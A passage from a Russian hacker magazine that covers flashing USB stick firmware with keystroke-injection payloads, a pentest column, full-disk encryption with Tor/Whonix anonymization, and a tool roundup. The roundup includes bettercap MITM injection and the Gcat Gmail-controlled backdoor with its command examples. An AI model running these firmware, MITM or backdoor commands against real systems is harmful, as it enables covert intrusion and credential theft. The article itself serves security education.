Kautilya, который позволяет автоматизировать создание пейлоадов. Для USB
Rubber Ducky тут есть целый сайт, позволяющий посредством удобного веб-ин-
терфейса прямо в онлайне создавать скрипты для девайса по своему вкусу.
И это помимо списка уже готовых скриптов, которые лежат на гитхабе проек-
та. На наше счастье, Ducky-скрипты можно сконвертировать в бинарный вид,
чтобы затем встроить их в прошивку. Для этого нам пригодится утилита Duck
Encoder.
   Что же по поводу самих скриптов, то тут есть сразу несколько вариантов:
•  можно набросать нужный скрипт самостоятельно, благо используемый
   синтаксис не сложен в освоении (см. официальный сайт проекта);
•  воспользоваться уже готовыми вариантами, выложенными на гитхаб, бла-
   го там есть и reverse shell, и прочие плюшки — остается только подправить
   и сконвертировать в бинарный вид;
•  либо же воспользоваться вышеупомянутым сайтом, который в пошаговом
  режиме проведет через все настройки и позволит скачать готовый скрипт
   в виде Ducky-скрипта (либо уже в сконвертированном бинарном виде).

Для того чтобы перевести скрипт в бинарный вид, необходимо выполнить сле-
дующую команду:

java -jar duckencoder.java -i keys.txt -o inject.bin

где keys.txt — Ducky-скрипт, а inject.bin — выходной бинарник.

ЗАЛИВАЕМ ПРОШИВКУ
Как только у нас на рукам появится готовый пейлоад, настанет время внедрять
его в прошивку. Выполняется это следующими двумя командами:

copy CFW.bin hid.bin
tools\EmbedPayload.exe inject.bin hid.bin
Обрати внимание, что сначала прошивка копируется в hid.bin, и только за-
тем перепрошивается. Делается это так потому, что пейлоад можно вннедрить
в прошивку только один раз, поэтому оригинальный CFW.bin надо сохранить
нетронутым.
  После такой манипуляции у нас на руках будет файл кастомной прошивки
hid.bin с внедренной в него полезной нагрузкой. Остается только залить по-
лученную прошивку на флешку:

tools\DriveCom.exe /drive=F /action=SendFirmware
    /burner=BN03V104M.BIN /firmware=hid.bin

где F — опять же, буква накопителя.

АЛЬТЕРНАТИВНЫЕ ВАРИАНТЫ
Помимо использования HID-природы флешки и превращения ее в клавиатуру,
набирающую наши пэйлоады, можно сотворить еще несколько трюков. Напри-
мер, можно создать на устройстве скрытый раздел, уменьшив место, которое
будет видеть ОС. Для этого сначала надо получить размер устройства в логи-
ческих блоках:

tools\DriveCom.exe /drive=E /action=GetNumLBAs

Затем в папке patch нужно найти файл base.c, раском-
ментировать строку #define   FEATURE_EXPOSE_HIDDEN_
PARTITION и добавить еще одну директиву define, задаю-
щую новое число LBA: #define NUM_LBAS  0xE6C980UL (это
число должно быть четным, так что если на предыдущем                                                        INFO
шаге ты получил, скажем, 0xE6C981, то можно уменьшить
число до 0xE6C940, например).                                  При использовании
                                                                               Ducky-скриптов
  После правки исходников, надо поместить прошивку,                                                                               следует помнить,
которую ты хочешь пропатчить, в папку patch под именем       что команда DELAY,
fw.bin и запустить build.bat, который создаст в patch\       выполняюшая за-
                                                                         держку на указанноеbin\ файл модифицированной прошивки fw.bin. Оста-                                                                            число миллисекунд,
нется только залить его на флешку.                                  на флешке будет
   Аналогичным образом делается Password Path и No       работать несколько
                                                                                иначе, чем на RubberBoot Mode Patch, про которые ты можешь подробней по-
                                                                               Ducky, поэтому вре-
смотреть на гитхабе проекта. Моей же основной целью                                                                  мя задержки придет-
было научить флешку выполнять заданные действия,       ся поднастраивать.
чего мы с тобой и добились.
ИТОГ
Поставленной цели мы добились. Более того: думаю,
ты теперь понял, что флешки (да и прочие USB-девай-
сы) нельзя больше рассматривать как просто абстракт-
ный накопитель, хранящий твою информацию. На самом
деле — это уже практически компьютер, который можно
                                    WWW
научить выполнять определенные действия. Хотя на дан-
ный момент РоС выложен только для одного конкретно-       Для того, чтобы про-
го контроллера, будь уверен, что в момент чтения статьи         верить, какой кон-
                                                                              троллер установленкто-то наверняка ковыряет другие.                                                                             на флешке, можно
   Так что будь осторожен при подключении USB-у-        воспользоваться ути-
стройств и держи ухо востро.                                          литой usbflashinfo.

TIPS

Если эксперименты пошли не так и с флешкой творится что-то непонятное,
то можно попытаться вернуть ее к жизни, вручную переведя ее в boot-режим,
и воспользовавшись утилитой для восстановления оригинальной прошивки.
Для этого надо перед ее подключение замкнуть 1 и 2 (иногда 2 и 3) контак-
ты контроллера, расположенные по диагонали от точки (чтобы было понятней
смотри соотвествующий рисунок). После этого можно попытаться восстано-
вить устройство с помощью официальной утилиты MPAL.





Переводим флешку в boot-режим, замыкая указанные контакты
ВЗЛОМ

Колонка Юрия Гольцева
QUANTITY
NE QUALITY

                       Юрий Гольцев
                                           Профессиональный whitehat, специалист
                                            по ИБ, еженедельно проводящий множество
                                              этичных взломов крупных организаций, редак-
                                               тор рубрики взлом, почетный член команды     .
                                         @Ygoltsev



Тестирование на проникновение (penetration testing) — метод
оценки безопасности компьютерных систем или сетей сред-
ствами моделирования атаки злоумышленника. Для кого-то
это хобби, для кого-то работа, для кого-то это стиль жизни.
На страницах нашего журнала мы постараемся познакомить
тебя с профессией настоящего «этичного хакера», с задачами,
которые перед ним ставятся, и их решениями.
INTRO
После выхода на экраны сериала Mr. Robot (от которого я тоже, если честно,
в восторге) образ хакера — консультанта по информационной безопасности
приятно преобразился в глазах окружающих людей, далеких от этой темы. Это,
безусловно, приятно. Но я опасаюсь, как бы это не привело к тому, что хипсте-
ры начнут не только пить смузи в антикафе, но и делать свои стартапы в обла-
сти ИТ-безопасности.
   Скорее всего, это может произойти параллельно с ростом спроса на кон-
салтинг в сфере ИБ. При таком развитии событий вероятность того, что заказчик
наткнется на недостаточно компетентного исполнителя, очень велик. Главной
проблемой может стать отсутствие грамотных критериев выбора исполнителя.
В современных российских реалиях ими могут выступить следующие факторы:
•  репутация исполнителя;
•  стоимость услуги;
•  наличие у исполнителя профильных сертификатов;
•  возможность отката;
•  наличие у исполнителя необходимых компетенций.

Такой подход не поощряет развитие ИБ как отрасли. Более половины приве-
денных мной факторов актуальны лишь потому, что стандартов предоставляе-
мых услуг до сих пор нет.
  К примеру, различные исполнители могут понимать тестирование на про-
никновение по-разному. Для кого-то пентест — это только эксплуатация из-
вестных техник и компоновка этого в отчет, для других это идентификация пу-
бличных уязвимостей. До тех пор пока не появится общепринятый стандарт
состава работ для той или иной услуги, выбрать исполнителя при ограничен-
ном бюджете проекта будет сложно.
   Конечно, целесообразнее и предпочтительнее инвестировать в развитие
своего отдела ИБ. Рядовые сотрудники отдела, обладающие нужными ком-
петенциями, смогут контролировать выполнение всех пунктов работ, а также
при необходимости выступать в роли менеджеров.





Mr. Robot TV series
Думаю, что в ближайший год мы увидим, сбудутся ли такие прогнозы.

CONTRIBUTE
Озвучив проблему, я хочу внести свою вклад в ее решение. Для наглядности я
разделю отрасль на три группы:
•  штатные безопасники;
•  консультанты-практики;
•  все остальные.

В профессиональном плане меня интересуют только первые две. Я готов по-
мочь каждой из них в случае, когда сложно самостоятельно ответить на во-
прос: «А все ли я сделал правильно?» Если ты не знаешь, как организовать ту
или иную работу в рамках анализа защиты подопечной тебе информационной
системы, но что-то подсказывает, что сделать это действительно нужно, я го-
тов дать советы для конкретной ситуации с условием, что можно будет опу-
бликовать информацию о ней ситуации без упоминания твоего имени. Если
ты причисляешь себя к консультантам-практикам по ИБ или хочешь таковым
стать и тебе нужен совет, напиши мне на goltsev@glc.ru — я посоветую.

DEVELOP YOURSELF
Тему тестирования на проникновение я уже полностью раскрыл в прошлых вы-
пусках колонки. В любой типичной ситуации ты сможешь найти ответ на боль-
шинство вопросов. Что до нетипичных, то мы будем рассматривать их по мере
появления.
  Все пентесты на самом деле проходят одинаково, но ровно до тех пор, пока
тебе не доказали обратное. Один мой друг задумался, как автоматизировать
весь процесс, — чтобы можно было предоставлять заказчику абсолютно те
же результаты, но с гораздо меньшими трудозатратами. Я с удовольствием
поддержал его идею: на мой взгляд, автоматизация чего-либо идет во благо
эволюции. В данном случае основной посыл такой: хочешь пентестить — либо
делай это лучше автоматизации, либо не делай совсем. Этакий челлендж man
against machine, как в старые добрые времена.
   Поискав, что есть на эту тему на профильных ресурсах, мы пришли к выво-
ду: серьезно автоматизировать процесс никто не пробовал, но все возможно-
сти для этого существуют. Большинство утилит, которые претендуют на звание
программы для массового поражения, — это что-то наподобие либо ms08-
067_I_k1ll_y0ur_n4tw4rk.exe, либо smbrelay_0ld_sch00l_l33t.sh или уже попсо-
вый, но еще относительно новый mimikatz_hack_them_all.ps1. Надеюсь, вы-
бранные для утилит названия в полной мере отражают их основные функции.
   Ориентироваться, конечно, придется на Windows, но я еще не встретил
ни одной большой корпоративной сети, которая бы работала не на Windows.
В сегодняшних реалиях весь mass pwnage основан на автоматизации аплоада
wce или mimikatz и пожинании плодов. Работает это удачно лишь в том случае,
если пентестер запускает утилиту на терминальной станции, где он является
администратором и где работает с десяток пользователей. Возможно, они
подключаются к другим системам, в которых обладают повышенными приви-
легиями. Скрипты работают по накатанной: закачал, запустил, распарсил вы-
вод, удалил, перешел к следующему хосту, повторил. Он не успокоится, пока
не получит привилегии администратора домена. Все хорошо, вот только воз-
никает вопрос: откуда появились исходные привилегии и куда смотрит анти-
вирус?
  Можно возразить, что такие утилиты используются теми, кто все-таки знает,
как получить необходимые привилегии. Можно также свалить все на «защиту
от скрипткидди». К сожалению, такая защита не очень работает — порог вхож-
дения в тему уже достаточно низок, и информацию не найдет только ленивый.
   Ряд действий, которые выполняются для того, чтобы получить привилегии,
можно и нужно автоматизировать. Думаю, что многие это понимают, но не афи-
шируют. Уже давно наступило время, когда по статистике количество уязвимо-
стей, эксплуатация которых абсолютно безопасна (не нарушает целостность
и доступность), превышает число уязвимостей, эксплуатация которых в рам-
ках тестирования на проникновение должна проводиться под наблюдением
за системой.
   Разработав, даже на коленке, набор утилит, которые реализуют обдуманную
эксплуатацию безопасных уязвимостей, можно будет тратить меньше усилий
и иметь результаты прежнего уровня. Кроме того, представители штатного от-
дела ИБ смогут самостоятельно использовать подобные скрипты, что благо-
приятно отразится на защищенности их систем, даже когда бюджет на опре-
деленные проекты по анализу защищенности отсутствует.
   Проект разработки набора утилит, автоматизирующих всевозможные дей-
ствия пентестера, стартовал, информацию о нем можно почерпнуть на GitHub.

OUTRO
Восемь лет назад вышел сотый номер журнала. В то время было сложно себе
представить, что тестирование на проникновение и анализ защищенности за-
интересует широкую публику. Сейчас это реальность. Технологии развиваются,
меняются, совершенствуются. Совершенствуйся и ты вместе с ними. Не оста-
навливайся на достигнутом. Изучай, делись и автоматизируй. Stay tuned!
ПОЛЕЗНАЯ ИНФОРМАЦИЯ


Автоматизация
•  Six ways to automate Metasploit
•  Metasploit Unleashed
•  Scripting Metasploit using MSGRPC

Right way to contribute
• DC7499
• DC7812

Общая теория по пентестам
•  Vulnerability Assessment
• Open Source Security Testing Methodology Manual
• The Penetration Testing Execution Standard

Немного практики
•  PentesterLab
•  Penetration Testing Practice Lab

В закладки
• Open Penetration Testing Bookmarks Collection
ВЗЛОМ





                                                                         Ярослав Шмелев
                                                                                      hummelchen@inbox.ru





                                                                         Борис Нагаев
                                                                                      bnagaev@gmail.com


                  НАСТРАИВАЕМ
                 ПОЛНОДИСКОВОЕ
                ШИФРОВАНИЕ
                 И АНОНИМИЗАЦИЮ
                  УРОВНЯ ОС
КАМУФЛЯЖ
ДЛЯ ПИНГВИНА
В наше время только ленивый не защищает свои личные
данные и не печется о своей приватности. Но мало кто
использует для этого полнодисковое шифрование, из-
за чего вся защита легко снимается при наличии физи-
ческого доступа к компьютеру. Сегодня мы разберемся,
как можно зашифровать весь жесткий диск, включая за-
грузчик, оставив себе возможность быстрого уничтоже-
ния данных без физического доступа к ним.
  Также мы с тобой рассмотрим, как защитить и аноними-
зировать сетевой трафик. Про Tor слышали практически
все, многие даже использовали его как прокси для от-
дельных приложений; мы же посмотрим, как эффективно
пользоваться им для полной анонимизации целой опера-
ционной системы.

ТРЕБОВАНИЯ К СИСТЕМЕ
Начнем мы наш рассказ с шифрования. Для начала давай сформулируем ос-
новные требования к системе, то есть что бы хотелось получить на выходе. Бу-
дем считать, что хорошая криптосистема должна шифровать абсолютно всё
содержимое жесткого диска так, чтобы его содержимое нельзя было отличить
от случайных данных. Загрузчик системы должен состоять из двух частей и на-
ходиться на флешке или другом сьёмном носителе. Первая, незащищенная
часть, по паролю расшифровывает вторую, в которой находится ядро системы
и ключи от жесткого диска. Система должна допускать быструю смену ключей
и паролей без потери данных, а работа с разделами должна быть такой же,
как и обычно.

АЛГОРИТМ РАБОТЫ
С требованиями определились. Теперь давай подумаем о том, как будем этого
добиваться. Итак, наша схема будет работать следующим образом:
•  при включении компьютера мы вставляем в него флешку,
•  она запускает загрузчик,
• мы вводим пароль,
•  после загрузки ОС флешка вынимается,
•  дальше работа с компьютером идёт как обычно.

В то время как обычные средства шифрования защищают только домашний
раздел или оставляют загрузчик на жестком диске — наша схема делает выклю-
ченный компьютер практически неуязвимым к снятию информации и протроя-
ниванию компонентов системы, а для уничтожения всех данных на нём доста-
точно просто уничтожить флешку. Когда компьютер включен, ключи от диска
находятся в оперативной памяти, поэтому для надёжной защиты от cold-boot
атак необходимо использовать пароль на BIOS/UEFI и входить в режим гибер-
нации, если нет возможности контролировать доступ к компьютеру.

ПОДГОТОВКА ДИСКА
Ну а теперь перейдем непосредственно к действиям.
Для осуществления задуманного нам понадобятся:
1. Live-DVD с любым дистрибутивом Linux (все команды в статье даны
   для Debian/Ubuntu);
2. Любая свободная флешка размером более 128 Мб;
3. Прямые руки.

Если ты хочешь защитить уже существующую систему, а не ставить новую, не-
обходимо сначала сделать её полный бэкап.
  Для начала нам нужно загрузиться с Live-DVD и определиться с носителями,
на которые будем ставить систему. В нашем примере мы работаем с дистри-
бутивом Debian, а наши носители — жесткий диск /dev/sda и флеш-карта /dev/
sdb. После загрузки нам необходимо открыть консоль с правами root и уста-
новить необходимые программы — полнодисковое шифрование cryptsetup
и загрузчик grub2:

apt-get install cryptsetup grub2

Если на жестком диске была какая-то незашифрованная информация, его не-
обходимо полностью перезаписать случайными данными. Для этого сначала
определим его размер в байтах:

fdisk -l /dev/sda

А затем затрем диск случайными данными:

openssl rand $размер_в_байтах | dd of=/dev/sda bs=512K

Теперь нам необходимо сгенерировать ключ шифрования и положить его в /
root/key:

dd if=/dev/random of=/root/key bs=1 count=32
Итак, форматируем жесткий диск:

cryptsetup luksFormat /dev/sda key

В начале диска, зашифрованного LUKS, есть заголовок, в котором перечис-
лены методы шифрования и зашифрованные ключи. Чтобы содержимое диска
выглядело как случайные данные, мы забэкапим и затрём этот заголовок:

cryptsetup luksHeaderBackup /dev/sda --header-backup-file
    /root/header.luks
dd if=/dev/urandom of=/dev/sda bs=1 count=1052672

Открываем наш зашифрованный диск:

cryptsetup -d=key --header=header.luks luksOpen /dev/sda rootfs

Далее с /dev/mapper/rootfs можно работать как с обычным жестким дис-
ком. При необходимости можно использовать RAID, LVM и даже создать
swap-раздел.
   Устанавливаем систему или копируем защищаемую:

mkdir /mnt/root
mkfs.ext4 /dev/mapper/rootfs
mount /dev/mapper/rootfs /mnt/root


УСТАНОВКА СИСТЕМЫ
В рамках статьи мы будем устанавливать Debian Jessie с помощью debootstrap,
утилиты для развёртывания базовой debian-based системы в папке другой си-
стемы (а скопировать уже существующую систему можно rsync-ом):

apt-get install debootstrap
debootstrap --arch amd64 jessie /mnt/root
    http://http.debian.net/debian

Теперь chroot-имся в неё, ставим необходимый софт и настраиваем initramfs:

chroot /mnt/root
apt-get install vim locales linux-image-3.16.0-4-amd64 cryptsetup
cp /usr/share/initramfs-tools/hooks/cryptroot
   /etc/initramfs-tools/hooks
CRYPTSETUP=y update-initramfs -k all -u

Обязательно нужно установить пароль на систему, если она новая:

passwd


НАСТРОЙКА СИСТЕМЫ
Так как теперь корневая ФС системы при загрузке теперь будет находиться
в /dev/mapper/rootfs, надо поправить информацию о файловых системах
в fstab:

vim /etc/fstab
/dev/mapper/rootfs / ext4 errors=remount-ro 0 1

Следующим шагом выходим из chroot и делаем копию initrd:

cp /mnt/rootfs/boot/initrd-(текущая версия) /tmp/initrd
mkdir /tmp/newinitrd
cd /tmp/newinitrd

Распаковываем его:

zcat ../initrd | cpio -idv

И подправляем скрипты, запускаемые при загрузке системы до монтирования
основных файловых систем. В файле ./scripts/local-top/ORDER необходи-
мо заменить cryptroot на crypto. Содержимое файла ./scripts/local-top/
crypto нужно заменить на скрипт, открывающий наш полностью зашифрован-
ный диск:

prereqs()
{
  echo “$PREREQ”
}
case $1 in
prereqs)
prereqs
exit 0
;;
esac
modprobe -b dm_crypt
modprobe -b aes_generic
modprobe -b sha256
/sbin/cryptsetup -d=/etc/key --header=/etc/header.luks \
luksOpen /dev/disk/by-id/$DISK_ID$ rootfs

$DISK_ID можно узнать, используя ls -l /dev/disk/by-id/ | grep sda. После
этого делаем скрипт исполняемым:

chmod +x ./scripts/local-top/crypto

Затем кладём в initrd ключ и заголовок тома:

cp /root/key /mnt/rootfs/initrd/etc/key
cp /root/header.luks /mnt/rootfs/initrd/header.luks

Собираем получившийся initrd и кладём его в папку /root:

find . | cpio -H newc -o > ../initrd
cd ..
gzip initrd
mv initrd.gz /root/initrd


ПОДГОТОВЛИВАЕМ ФЛЕШКУ
Пришло время заняться флешкой, без которой наш зашифрованный диск бу-
дет представлять собой несвязанный набор байт. Начинаем с ее разметки:

parted
(parted) select /dev/sdb
(parted) mklabel msdos
(parted) mkpart primary 5 100 # Раздел с любой файловой системой
(parted) mkpart primary 100 200 # с initrd и ядром, защищен luks
(parted) mkpart primary 200 250 # с grub

Теперь шифруем раздел и устаналиваем на него пароль (как ты помнишь, мы
разбиваем флешку на два раздела):

cryptsetup luksFormat /dev/sdb2

Остается настроить загрузчик. Для этого открываем /etc/default/grub и до-
бавляем в конец файла строку GRUB_ENABLE_CRYPTODISK=1. После этого фор-
матируем раздел под загрузчик:

mkfs.ext2 /dev/sdb3

И монтируем его:

mkdir /mnt/grub
mount /dev/sdb3 /mnt/grub

Устанавливаем GRUB на флеш-карту. Значение --target следует выбрать
в зависимости от параметров твоего компьютера. Наиболее универсальный
вариант — i386-pc:

grub-install --target=i386-pc --root-directory /mnt/grub/ /dev/sdb

Теперь создадим файл конфигурации /mnt/grub/grub.cfg:

set timeout=5
set default=0
menuentry “Linux” {
  insmod cryptodisk
  insmod luks
  cryptomount hd0,msdos2
  set root=(crypto0)
  linux /vmlinuz root=/dev/mapper/rootfs ro quiet
  initrd /initrd
}

                                                                     Загрузчик
                                                                 системы
                                                                      теперь вы-
                                                                      глядит так
В этом файле мы задаем одну строку меню «Linux», при запуске которой после
ввода пароля открывается зашифрованный раздел флешки с ядром системы
и ключами от жесткого диска.

                                                               Ввод пароля
                                                                            от флешки

После этого открываем защищенный раздел на флешке:

cryptsetup luksOpen /dev/sdb2 cryptboot

Форматируем его и монтируем:

mkfs.ext2 /dev/mapper/cryptboot
mkdir /mnt/cryptboot
mount /dev/mapper/cryptboot /mnt/cryptboot





Hex-дамп заголовка диска и флешки
После чего копируем в него ядро и initrd:

cp /root/initrd /mnt/cryptboot/initrd
cp /mnt/rootfs/boot/vmlinuz-(твоя версия) /mnt/cryptboot/vmlinuz
sync

Всё готово!

Размонтируем диски и перезагружаемся:

umount /mnt/*
cryptsetup luksClose /dev/mapper/cryptboot
cryptsetup luksClose /dev/mapper/rootfs
sync
shutdown -r now


АНОНИМИЗАЦИЯ ОС
С шифрованием разобрались. Теперь пришло время поговорить об аноними-
зации системы.
  Во многих случаях (например, при анализе вредоносного программного
обеспечения) необходимо изолировать всю операционную систему и анони-
мизировать её трафик таким образом, чтобы никакие действия в ней не приве-
ли к раскрытию нашего ip-адреса или утере важных данных. Для этого восполь-
зуемся схемой на основе связки Whonix (виртуальной машины, выступающей
в качестве шлюза, перенаправляющего трафик в Tor) и любой другой вирту-
альной машины.

НАСТРОЙКА
По шагам:
•  Скачиваем Virtualbox, Whonix Gateway и Kali;
•  Проверяем ova-файл, устанавливаем и обновляем Whonix по инструкции
   на сайте;
•  Для отключения графического интерфейса — выделяем виртуальной ма-
  шине 120 Мб оперативной памяти;
•  Затем проверяем файл с образом диска Kali и создаём под него новую вир-
   туальную машину;
• В настройках сетевого адаптера VM выбираем внутреннюю сеть whonix;
•  Включаем систему;
•  Настраиваем сеть вручную или с помощью Network Manager-а:
     - ip 10.152.152.11
     - шлюз 10.152.152.10
     - dns-сервер 10.152.152.10

Перед началом работы необходимо убедиться, что сеть работает нормально,
и только потом обновить ОС и установить все необходимые приложения. Разу-
меется, не отключая Tor. При этом ни в коем случае нельзя устанавливать Guest
Additions, так как они синхронизируют время на реальной и виртуальной маши-
не, расшаривают буфер обмена, могут получить доступ к микрофону и вообще
содержат в себе довольно много потенциально опасной функциональности.
   Кстати говоря, в нашем случае для усложения отслеживания лучше исполь-
зовать Tor Browser с правами обычного пользователя, так как стандартный
браузер Kali довольно редок и запускается от рута. Для этого устанавливаем
sux, который позволит нам запускать графические приложения от имени дру-
гого пользователя:

wget http://ftp.us.debian.org/debian/pool/main/s/sux/sux_1.0.1-6_all.deb
dpkg -i sux_1.0.1-6_all.deb

Скачиваем браузер с официальной страницы проекта. Опять же на всякий слу-
чай проверяем целостность скачанного файла (по данной инструкции). Затем
создаём пользователя torbrowser, логинимся в него через su и распаковываем
архив с правами этого пользователя:

tar xf tor-browser-linux64-4.5.3_en-US.tar.xz

Далее отключаем в нём Tor, так как весь трафик уже анонимизируется на вир-
туальной машине с Whonix, а Tor через Tor - это вредно и очень медленно.
Как это сделать, можно посмотреть тут. Ну и, наконец, запускаем torbrowser:

sux torbrowser tor-browser_en-US/Browser/start-tor-browser

Настройка ssh и sshfs для включенной машины

Для подключения к гостевой машине через ssh нужно сначала подключиться
к Whonix-Gateway, пробросив порт, а потом из Whonix-Gateway подключиться
к ssh-серверу, запущенному на Kali. Аналогичным способом можно получить
доступ к файлам на Kali с помощью двойного sshfs.
После этого необходимо создать снимок, из которого можно будет загружать-
ся перед каждым сеансом работы, зная, что на компьютере не осталось ника-
ких материалов от предыдущего. Для ещё более надежной защиты от фингер-
принтинга можно каждый раз устанавливать и настраивать эти виртуальные
машины заново.

ВО ВРЕМЯ РАБОТЫ
Перед запуском Whonix Gateway и Kali рекомендую включить VPN и поставить
на закачку несколько произвольных торрентов с большим количеством си-
дов — например, с популярными дистрибутивами Linux-a. Это сильно затруд-
нит проведение атак, основанных на статистическом анализе трафика. Кроме
того, чтобы избежать случайной утечки информации, желательно закрыть все
посторонние программы.
  Сам же порядок запуска такой: сначала запускаем Whonix, дожидаемся за-
вершения первичной настройки и затем запускаем Kali. При необходимости —
перед запуском Kali восстанавливаем её чистый снимок. По окончании рабо-
ты необходимо, в обратном порядке, выключить сначала виртуальную машину
с Kali, затем Whonix.

TIPS & TRICKS
Ну а теперь приведем несколько советов, которые обязательно пригодятся
тебе в будущем.
Совет 1. Чтобы сменить цепочку Tor-серверов и выходную ноду, необходимо
запустить в консоли Whonix Gateway утилиту arm и нажать клавишу «n».
Совет 2. Для безопасного обмена данными с выключенной виртуальной ма-
шиной можно монтировать её диски с помощью vdfuse:

sudo apt-get install vdfuse (для других дистрибутивов может быть иное)
sudo vdfuse -t VMDK -f /path/Kali-Linux.vmdk /mnt/mountpoint1
sudo mount /mnt/mountpoint1/Partition /mnt/mountpoint2

Совет 3. При подключении по ssh из реальной машины можно использовать
tmux для одновременной работы с терминалом изнутри и снаружи VM. Для это-
го необходимо запустить tmux в Kali, подключиться к ней по ssh и выполнить
tmux  a. Можно также смонтировать папки виртуальной машины с помощью
sshfs:

sshfs root/user@VM:/ /mnt/mountpoint

Совет 4. Для приватной анонимной связи и передачи файлов я рекомендую
torchat. Его стоит запускать в основной системе, чтобы предотвратить сце-
нарий Tor-over-Tor, утечку и потерю данных. Для связи с группой лиц можно ис-
пользовать свои irc- или jabber-серверы в качестве onion-ресурсов: рекомен-
дуемый клиент — Pidgin, система криптографической защиты чатов — otr.
Совет 5. В случае если необходимо анонимно работать с не-TCP-шными про-
токолами, можно воспользоваться VPN (желательно — не требующей реги-
страции). Для этого обычно нужно скачать соответствующий конфигурацион-
ный файл и использовать команду sudo openvpn config.ovpn.

МЕРЫ ПРЕДОСТОРОЖНОСТИ
Хотя рассмотренная схема и гарантирует защиту от утечки ip-адреса из вир-
туальной машины, для настоящей анонимности необходимо соблюдать сле-
дующие правила:
•  Нельзя подключаться к своим ресурсам;
•  Нельзя заходить в аккаунты, которые использовались тобой без Tor-а;
•  Нужно помнить, что все нешифрованные данные могут перехватываться
    exit nod-ой;
•  Нельзя допускать прохождение трафика Tor-a через Tor, так ноды двух це-
   почек могут случайно совпасть, тем самым сокращая эффективную длину
   цепочки вплоть до 1 машины;
•  При передаче файлов нужно защищать их криптографическими и стегано-
   графическими методами, используя утилиты gpg и steghide, и анонимизи-
   ровать их метаданные, например, с помощью mat (Metadata Anonymisation
    Toolkit).

ИТОГО
Ну вот и все, чем я хотел поделиться с тобой сегодня. Надеюсь, данная неболь-
шая статья-инструкция поможет тебе защитить свои данные и личную жизнь
от чужих глаз. Удачи и до новых встреч!
ВЗЛОМ





                                 Дмитрий «D1g1» Евдокимов,
                                                                Digital Security
                                               @evdokimovds





СОФТ ДЛЯ ВЗЛОМА И АНАЛИЗА БЕЗОПАСНОСТИ





                         WARNING

                                    Внимание! Информация
                                          представлена
                                     исключительно с целью
                                     ознакомления! Ни авторы,
                                     ни редакция за твои
                                     действия ответственности
                                           не несут!
                         Автор:
                               Francis Alexander

                       URL:
                              github.com/torque59/Nosql-
                              Exploitation-Framework

                        Система:
                               Linux

NOSQL EXPLOITATION FRAMEWORK
NoSQL базы данных все чаще и чаще начинают использоваться и, соответ-
ственно, встречаться и на пентестах. В связи с чем не стоит проходить мимо
них, а нужно обращать на них внимание и пытаться поднять привилегии через
их недостатки или уязвимости. При том что и инструменты уже есть.
  NoSQL Exploitation Framework — инструмент, сфокусированный на скани-
ровании и эксплуатации NoSQL баз данных. На данный момент присутствует
поддержка Mongo, CouchDB, Redis, H-Base, Cassandra, но планируется и даль-
нейшее расширение поддерживаемых баз данных.
Возможности:
•  энумерация NoSQL баз данных;
•  дамп NoSQL баз данных;
•  поддержка NoSQL Web Apps;
•  набор payload’ов для JS injection, Web application Enumeration;
•  атака по словарю;
•  запрос в поисковике Shodan;

При этом присутствует мультипоточное сканирование по списку IP-адресов.
Установка чрезвычайно проста:

$ sudo apt-get install python-setuptools
$ pip install -r requirements.txt
$ nosqlframework.py -h

Та`к же несложен инструмент и в использовании:

$ nosqlframework.py -ip localhost -scan
                         Автор:
                          Simone Margaritelli

                       URL:
                             www.bettercap.org

                        Система:
                               Linux


BETTERCAP
Если тебе надоело носить с собой десяток инструментов для проведения
атаки man-in-the-middle и расстраиваться из-за нестабильности и сложности
ettercap, то встречай новый инструмент с нескромным названием bettercap.
   Bettercap — это легко расширяемый модульный портативный инструмент
и фреймворк для MITM-атак на Ruby со всевозможными диагностическими
и атакующими функциями, какие только могут пригодиться для атаки «человек
посередине». Можно атаковать как всю сеть, так и определенные машины.
   Встроенный снифер и диссектор на сегодня способен из коробки соби-
рать:
•  информацию о посещенных URL;
•  о посещенных HTTPS-хостах;
•  данные HTTP POST-запросов;
•  HTTP Basic и Digest аутентификации;
•  аутентификационные данные от FTP, IRC, POP, IMAP, SMTP, NTLMv1/v2
   (HTTP, SMB, LDAP и так далее).

Пример HTTPS proxy с пользовательским pem-сертификатом:

$ sudo bettercap --proxy-https --proxy-pem
    ./mycert.pem

При желании можно очень просто поднять без каких-либо заморочек свой
собственный HTTP-сервер. Пример поднятия своего HTTP-сервера с моду-
лем инъекции данных:

$ sudo bettercap --httpd
    --http-path=/path/to/your/js/file/
    --proxy --proxy-module=inject.rb
                         Автор:
                          Greg Foss

                       URL:
                             github.com/gfoss/PSRecon/

                        Система:
                         Windows


PSRECON
Язык PowerShell становится все популярнее и популярнее для решения задач
информационной безопасности на Windows-системах: как заражения и кражи
данных, так и их защиты.
  PSRecon — это сборщик данных с удаленных Windows-систем с использо-
ванием PowerShell (v2 и более поздних). Инструмент организует все данные
по директориям, хешам и другим системным свойствам, а затем рассылает
информацию по почте или по шаре команде безопасности. Как, я думаю, ты
уже понял, данный инструмент интересен в первую очередь внутренней ко-
манде безопасности компании для реагирования на инциденты.
  Пример запуска скрипта на удаленной машине:

PS C:\> .\psrecon.ps1 -remote
    -target [computer]

Основные сценарии использования:
1. Базовое реагирование на инцидент.
2. Интеграция с SIEM-решением.
3. Удаленное извлечение данных и включение карантина на системе.

При этом PSRecon никаким образом не модифицирует систему и не оставляет
собственных логов. Конечно, при всем при этом стоит помнить, что на маши-
нах должно быть разрешено выполнение PowerShell-скриптов.
                         Автор:
                             byt3bl33d3r

                       URL:
                              github.com/byt3bl33d3r/gcat

                        Система:
                            Windows/Linux


GCAT
Gcat — скрытный backdoor на Python, использующий Gmail в качестве C&C
(command and control) сервера.
  Для его работы требуется аккаунт на Gmail и включенная опция Allow less
secure apps в настройках аккаунта.
Сам репозиторий содержит два файла:
•  gcat.py — скрипт для перечисления доступных клиентов и передачи им команд;
•  implant.py — непосредственно сам backdoor.

Там и там достаточно подправить переменные gmail_user и gmail_pwd.
   Доступные команды на клиенте:
выполнить команду;
•  скачать файл с зараженной системы;
•  выполнить отправленный шелл-код;
•  получить скриншот;
•  заблокировать экран клиента;
•  запустить keylogger;
•  остановить keylogger.

Пример запуска команды на клиенте:

# python gcat.py
   -id 90b2cd83-cb36-52de-84ee-99db6ff41a11
   -cmd ‘ipconfig /all’
[*] Command sent successfully with jobid: SH3C4gv

А затем просим результат для соответствующего ID и JobID:

# python gcat.py
   -id 90b2cd83-cb36-52de-84ee-99db6ff41a11
   -jobid SH3C4gv
DATE: ‘Tue, 09 Jun 2015 06:51:44 -0700 (PDT)’
JOBID: SH3C4gv
FG WINDOW: ‘Command Prompt - C:\Python27\python.exe implant.py’
CMD: ‘ipconfig /all’

